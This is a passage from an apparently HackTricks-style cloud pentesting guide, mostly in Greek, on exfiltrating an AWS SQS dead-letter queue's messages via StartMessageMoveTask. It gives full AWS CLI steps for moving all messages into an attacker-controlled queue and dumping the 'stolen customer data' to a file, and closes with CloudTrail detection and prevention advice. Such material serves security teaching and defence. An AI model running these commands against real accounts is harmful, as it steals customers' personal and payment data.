# AWS – SQS DLQ Redrive Exfiltration via StartMessageMoveTask

{{#include ../../../../banners/hacktricks-training.md}}

## Description

Κακοποίηση των SQS message move tasks για να κλαπούν όλα τα συσσωρευμένα μηνύματα από το Dead-Letter Queue (DLQ) ενός θύματος αναδρομολογώντας τα σε ουρά ελεγχόμενη από τον επιτιθέμενο χρησιμοποιώντας `sqs:StartMessageMoveTask`. Αυτή η τεχνική εκμεταλλεύεται το νόμιμο χαρακτηριστικό ανάκτησης μηνυμάτων του AWS για να εξάγει ευαίσθητα δεδομένα που έχουν συσσωρευτεί σε DLQs με την πάροδο του χρόνου.

## What is a Dead-Letter Queue (DLQ)?

Μια Dead-Letter Queue είναι μια ειδική SQS ουρά όπου τα μηνύματα αποστέλλονται αυτόματα όταν δεν επεξεργάζονται επιτυχώς από την κύρια εφαρμογή. Αυτά τα αποτυχημένα μηνύματα συχνά περιέχουν:
- Ευαίσθητα δεδομένα εφαρμογής που δεν μπορούσαν να επεξεργαστούν
- Λεπτομέρειες σφαλμάτων και πληροφορίες debugging
- Personal Identifiable Information (PII)
- API tokens, credentials, ή άλλα secrets
- Επιχειρηματικά κρίσιμα δεδομένα συναλλαγών

Οι DLQs λειτουργούν ως "νεκροταφείο" για αποτυχημένα μηνύματα, καθιστώντας τα πολύτιμους στόχους αφού συσσωρεύουν ευαίσθητα δεδομένα με την πάροδο του χρόνου που οι εφαρμογές δεν μπόρεσαν να διαχειριστούν σωστά.

## Attack Scenario

**Real-world example:**
1. **E-commerce application** επεξεργάζεται παραγγελίες πελατών μέσω SQS
2. **Some orders fail** (προβλήματα πληρωμής, αποθέματος, κ.λπ.) και μεταφέρονται σε ένα DLQ
3. **DLQ accumulates** εβδομάδες/μήνες αποτυχημένων παραγγελιών που περιέχουν δεδομένα πελατών: {"customerId": "12345", "creditCard": "4111-1111-1111-1111", "orderTotal": "$500"}
4. **Attacker gains access** σε AWS credentials με δικαιώματα SQS
5. **Attacker discovers** ότι το DLQ περιέχει χιλιάδες αποτυχημένες παραγγελίες με ευαίσθητα δεδομένα
6. **Instead of trying to access individual messages** (αργό και προφανές), ο επιτιθέμενος χρησιμοποιεί `StartMessageMoveTask` για μαζική μεταφορά ΟΛΩΝ των μηνυμάτων στην δική του ουρά
7. **Attacker extracts** όλα τα ιστορικά ευαίσθητα δεδομένα με μία ενέργεια

## Requirements
- Η source queue πρέπει να έχει ρυθμιστεί ως DLQ (referenced by at least one queue RedrivePolicy).
- IAM permissions (τρέχοντας ως ο συμβιβασμένος victim principal):
- Στο DLQ (source): `sqs:StartMessageMoveTask`, `sqs:GetQueueAttributes`.
- Στην destination queue: δικαίωμα παράδοσης μηνυμάτων (π.χ. queue policy που επιτρέπει `sqs:SendMessage` από τον victim principal). Για προορισμούς στο ίδιο account αυτό συνήθως επιτρέπεται από προεπιλογή.
- Αν είναι ενεργοποιημένο το SSE-KMS: στο source CMK `kms:Decrypt`, και στο destination CMK `kms:GenerateDataKey`, `kms:Encrypt`.

## Impact
**Potential Impact**: Εξαγωγή ευαίσθητων payloads που έχουν συσσωρευτεί σε DLQs (αποτυχημένα events, PII, tokens, application payloads) με υψηλή ταχύτητα χρησιμοποιώντας τις εγγενείς SQS APIs. Λειτουργεί cross-account εάν η destination queue policy επιτρέπει `SendMessage` από τον victim principal.

## How to Abuse

- Εντοπίστε το victim DLQ ARN και βεβαιωθείτε ότι αυτό αναφέρεται πραγματικά ως DLQ από κάποια ουρά (οποιαδήποτε ουρά είναι αποδεκτή).
- Δημιουργήστε ή επιλέξτε μια attacker-controlled destination queue και πάρτε το ARN της.
- Ξεκινήστε ένα message move task από το victim DLQ προς την destination queue σας.
- Παρακολουθήστε την πρόοδο ή ακυρώστε αν χρειαστεί.

### CLI Example: Exfiltrating Customer Data from E-commerce DLQ

**Scenario**: Ένας επιτιθέμενος έχει παραβιάσει AWS credentials και ανακάλυψε ότι μια e-commerce εφαρμογή χρησιμοποιεί SQS με ένα DLQ που περιέχει αποτυχημένες προσπάθειες επεξεργασίας παραγγελιών πελατών.

1) **Discover and examine the victim DLQ**
```bash
# List queues to find DLQs (look for names containing 'dlq', 'dead', 'failed', etc.)
aws sqs list-queues --queue-name-prefix dlq

# Let's say we found: https://sqs.us-east-1.amazonaws.com/123456789012/ecommerce-orders-dlq
VICTIM_DLQ_URL="https://sqs.us-east-1.amazonaws.com/123456789012/ecommerce-orders-dlq"
SRC_ARN=$(aws sqs get-queue-attributes --queue-url "$VICTIM_DLQ_URL" --attribute-names QueueArn --query Attributes.QueueArn --output text)

# Check how many messages are in the DLQ (potential treasure trove!)
aws sqs get-queue-attributes --queue-url "$VICTIM_DLQ_URL" \
--attribute-names ApproximateNumberOfMessages
# Output might show: "ApproximateNumberOfMessages": "1847"
```
2) **Δημιουργήστε attacker-controlled ουρά προορισμού**
```bash
# Create our exfiltration queue
ATTACKER_Q_URL=$(aws sqs create-queue --queue-name hacker-exfil-$(date +%s) --query QueueUrl --output text)
ATTACKER_Q_ARN=$(aws sqs get-queue-attributes --queue-url "$ATTACKER_Q_URL" --attribute-names QueueArn --query Attributes.QueueArn --output text)

echo "Created exfiltration queue: $ATTACKER_Q_ARN"
```
3) **Εκτέλεσε την μαζική κλοπή μηνυμάτων**
```bash
# Start moving ALL messages from victim DLQ to our queue
# This operation will transfer thousands of failed orders containing customer data
echo "Starting bulk exfiltration of $SRC_ARN to $ATTACKER_Q_ARN"
TASK_RESPONSE=$(aws sqs start-message-move-task \
--source-arn "$SRC_ARN" \
--destination-arn "$ATTACKER_Q_ARN" \
--max-number-of-messages-per-second 100)

echo "Move task started: $TASK_RESPONSE"

# Monitor the theft progress
aws sqs list-message-move-tasks --source-arn "$SRC_ARN" --max-results 10
```
4) **Συλλογή των κλεμμένων ευαίσθητων δεδομένων**
```bash
# Receive the exfiltrated customer data
echo "Receiving stolen customer data..."
aws sqs receive-message --queue-url "$ATTACKER_Q_URL" \
--attribute-names All --message-attribute-names All \
--max-number-of-messages 10 --wait-time-seconds 5

# Example of what an attacker might see:
# {
#   "Body": "{\"customerId\":\"cust_12345\",\"email\":\"john@example.com\",\"creditCard\":\"4111-1111-1111-1111\",\"orderTotal\":\"$299.99\",\"failureReason\":\"Payment declined\"}",
#   "MessageId": "12345-abcd-6789-efgh"
# }

# Continue receiving all messages in batches
while true; do
MESSAGES=$(aws sqs receive-message --queue-url "$ATTACKER_Q_URL" \
--max-number-of-messages 10 --wait-time-seconds 2 --output json)

if [ "$(echo "$MESSAGES" | jq '.Messages | length')" -eq 0 ]; then
echo "No more messages - exfiltration complete!"
break
fi

echo "Received batch of stolen data..."
# Process/save the stolen customer data
echo "$MESSAGES" >> stolen_customer_data.json
done
```
### Δια-λογαριασμικές σημειώσεις
- Η ουρά προορισμού πρέπει να έχει resource policy που επιτρέπει στον principal του θύματος να `sqs:SendMessage` (και, αν χρησιμοποιείται, KMS grants/permissions).

## Γιατί αυτή η επίθεση είναι αποτελεσματική

1. **Legitimate AWS Feature**: Uses built-in AWS functionality, making it hard to detect as malicious  
2. **Bulk Operation**: Transfers thousands of messages quickly instead of slow individual access  
3. **Historical Data**: DLQs accumulate sensitive data over weeks/months  
4. **Under the Radar**: Many organizations don't monitor DLQ access closely  
5. **Cross-Account Capable**: Can exfiltrate to attacker's own AWS account if permissions allow

## Ανίχνευση και Πρόληψη

### Ανίχνευση
Παρακολουθήστε το CloudTrail για ύποπτες κλήσεις API `StartMessageMoveTask`:
```json
{
"eventName": "StartMessageMoveTask",
"sourceIPAddress": "suspicious-ip",
"userIdentity": {
"type": "IAMUser",
"userName": "compromised-user"
},
"requestParameters": {
"sourceArn": "arn:aws:sqs:us-east-1:123456789012:sensitive-dlq",
"destinationArn": "arn:aws:sqs:us-east-1:attacker-account:exfil-queue"
}
}
```
### Πρόληψη
1. **Ελάχιστη Άδεια**: Περιορίστε τις άδειες `sqs:StartMessageMoveTask` μόνο στους απαραίτητους ρόλους
2. **Παρακολούθηση DLQs**: Ρυθμίστε CloudWatch alarms για ασυνήθη δραστηριότητα στα DLQs
3. **Πολιτικές Δια-Λογαριασμών**: Ελέγξτε προσεκτικά τις πολιτικές ουρών SQS που επιτρέπουν πρόσβαση από άλλους λογαριασμούς
4. **Κρυπτογράφηση DLQs**: Χρησιμοποιήστε SSE-KMS με περιορισμένες πολιτικές κλειδιού
5. **Τακτικός Καθαρισμός**: Μην αφήνετε ευαίσθητα δεδομένα να συσσωρεύονται στα DLQs επ' αόριστον

{{#include ../../../../banners/hacktricks-training.md}}
